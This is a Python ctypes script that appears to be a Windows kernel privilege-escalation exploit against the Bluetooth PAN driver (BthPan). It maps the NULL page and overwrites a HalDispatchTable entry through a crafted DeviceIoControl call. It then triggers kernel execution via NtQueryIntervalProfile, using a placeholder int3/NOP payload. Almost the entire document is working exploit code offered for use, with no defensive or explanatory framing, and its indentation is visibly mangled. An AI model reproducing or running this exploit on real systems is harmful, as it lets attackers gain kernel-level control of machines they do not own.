from ctypes import *
from struct import pack
from os import getpid,system
from sys import exit
     EnumDeviceDrivers,GetDeviceDriverBaseNameA,CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory,LoadLibraryExA = windll.Psapi.EnumDeviceDrivers,windll.Psapi.GetDeviceDriverBaseNameA,windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory,windll.kernel32.LoadLibraryExA
     GetProcAddress,DeviceIoControlFile,NtQueryIntervalProfile,CloseHandle = windll.kernel32.GetProcAddress,windll.ntdll.ZwDeviceIoControlFile,windll.ntdll.NtQueryIntervalProfile,windll.kernel32.CloseHandle
     INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0
      
     # thanks to offsec for the concept
     # I re-wrote the code as to not fully insult them 
     def getBase(name=None):
        retArray = c_ulong*1024
        ImageBase = retArray()
        callback = c_int(1024)
        cbNeeded = c_long()
        EnumDeviceDrivers(byref(ImageBase),callback,byref(cbNeeded))
        for base in ImageBase:
            driverName = c_char_p("\x00"*1024)
            GetDeviceDriverBaseNameA(base,driverName,48)
            if (name):
                if (driverName.value.lower() == name):
                    return base
            else:
                return (base,driverName.value)
        return None
      
     handle = CreateFileA("\\\\.\\BthPan",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
     if (handle == INVALID_HANDLE_VALUE):
    print "[!] Could not open handle to BthPan"
    exit(1)
     NtAllocateVirtualMemory(-1,byref(c_int(0x1)),0x0,byref(c_int(0xffff)),0x1000|0x2000,0x40)
     buf = "\xcc\xcc\xcc\xcc"+"\x90"*0x400
     WriteProcessMemory(-1, 0x1, "\x90"*0x6000, 0x6000, byref(c_int(0)))
     WriteProcessMemory(-1, 0x1, buf, 0x400, byref(c_int(0)))
     kBase,kVer = getBase()
     hKernel = LoadLibraryExA(kVer,0,1)
     HalDispatchTable = GetProcAddress(hKernel,"HalDispatchTable")
     HalDispatchTable -= hKernel
     HalDispatchTable += kBase
     HalDispatchTable += 0x4
     DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x0012d814,0x1,0x258,HalDispatchTable,0)
     CloseHandle(handle)
     NtQueryIntervalProfile(c_ulong(2),byref(c_ulong()))
     exit(0)